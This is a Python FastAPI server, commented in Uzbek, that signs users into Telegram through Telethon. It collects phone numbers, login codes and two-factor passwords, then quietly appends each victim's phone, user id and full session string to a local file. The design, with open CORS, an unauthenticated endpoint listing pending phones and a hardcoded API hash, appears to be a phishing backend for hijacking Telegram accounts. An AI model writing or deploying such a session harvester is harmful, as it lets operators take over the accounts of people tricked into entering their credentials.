#!/usr/bin/env python3
"""
Oddiy Telegram auth server
"""

import os
import logging
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import uvicorn
from dotenv import load_dotenv

# .env faylidan yuklash
load_dotenv()

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Konfiguratsiya
API_ID = int(os.getenv("API_ID", "33223639"))
API_HASH = os.getenv("API_HASH", "da4a254e086d07d78998b7992e64a39b")

app = FastAPI(title="Simple Telegram Auth")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Ma'lumot modellari
class SendCodeRequest(BaseModel):
    phone: str

class VerifyRequest(BaseModel):
    phone: str
    code: str = None
    phone_code_hash: str = None
    password: str = None

# Faol mijozlar
clients = {}

@app.get("/")
async def root():
    return {
        "status": "running",
        "endpoints": ["/send_code", "/verify"]
    }

@app.post("/send_code")
async def send_code(req: SendCodeRequest):
    """Kod yuborish"""
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    
    try:
        await client.connect()
        result = await client.send_code_request(req.phone)
        
        # Mijozni saqlash
        clients[req.phone] = {
            "client": client,
            "hash": result.phone_code_hash
        }
        
        logger.info(f"Kod yuborildi: {req.phone}")
        
        return {
            "status": "success",
            "phone_code_hash": result.phone_code_hash,
            "timeout": result.timeout
        }
        
    except errors.FloodWaitError as e:
        logger.warning(f"Flood wait: {e.seconds}")
        raise HTTPException(429, f"Kuting {e.seconds} soniya")
        
    except errors.PhoneNumberInvalidError:
        logger.warning(f"Noto'g'ri raqam: {req.phone}")
        raise HTTPException(400, "Noto'g'ri telefon raqam")
        
    except Exception as e:
        logger.error(f"Xatolik: {e}")
        raise HTTPException(500, "Server xatoligi")

@app.post("/verify")
async def verify(req: VerifyRequest):
    """Kodni tekshirish"""
    if req.phone not in clients:
        raise HTTPException(400, "Sessiya topilmadi")
    
    client_data = clients[req.phone]
    client = client_data["client"]
    
    try:
        if req.password:
            # 2FA
            await client.sign_in(password=req.password)
        else:
            # Oddiy kod
            await client.sign_in(
                req.phone,
                req.code,
                phone_code_hash=req.phone_code_hash or client_data["hash"]
            )
        
        # Muvaffaqiyatli kirish
        me = await client.get_me()
        session_str = client.session.save()
        
        # Sessiyani saqlash
        with open("sessions.txt", "a") as f:
            f.write(f"{req.phone}|{me.id}|{session_str}\n")
        
        logger.info(f"Kirish muvaffaqiyatli: {me.first_name}")
        
        # Tozalash
        del clients[req.phone]
        
        return {
            "status": "success",
            "user": {
                "id": me.id,
                "first_name": me.first_name,
                "username": me.username
            }
        }
        
    except errors.SessionPasswordNeededError:
        return {"status": "2fa_needed"}
        
    except errors.PhoneCodeInvalidError:
        raise HTTPException(400, "Noto'g'ri kod")
        
    except errors.PasswordHashInvalidError:
        raise HTTPException(400, "Noto'g'ri parol")
        
    except Exception as e:
        logger.error(f"Xatolik: {e}")
        raise HTTPException(500, "Server xatoligi")

@app.get("/stats")
async def stats():
    """Statistika"""
    return {
        "active_sessions": len(clients),
        "active_phones": list(clients.keys())
    }

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)